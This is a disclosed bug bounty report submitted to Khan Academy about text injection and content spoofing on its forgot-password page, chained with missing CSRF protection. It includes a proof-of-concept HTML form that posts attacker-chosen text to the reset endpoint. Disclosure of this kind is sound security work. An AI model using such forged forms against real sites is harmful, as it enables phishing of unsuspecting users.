# The web app's forgot password page is vulnerable to text injection/content spoofing

## Report Details
- **Report ID**: 159213
- **URL**: https://hackerone.com/reports/159213
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-14T09:16:21.307Z
- **Disclosed**: 2017-03-01T15:53:53.226Z

## Reporter
- **Username**: saurabhb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: khanacademy

## Vulnerability Information
An attacker will exploit this by chaining it with CSRF (there is not protection against CSRF for that page) as scenario can only be created by a POST request.
The attacker will target innocent users by doing this and some of them would fall in trap by calling the number or by sending the email. More about attack scenario at https://www.owasp.org/index.php/Content_Spoofing

Refer the attached image as proof of concept.

Also the proof of exploiting it using CSRF is:

<html>
  <body>
    <form action="https://www.khanacademy.org/forgotpw" method="POST">
      <input type="hidden" name="email" value="<the malicous text will come here>" />
      <input type="hidden" name="reset" value="Reset&#32;password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Attachments
No attachments
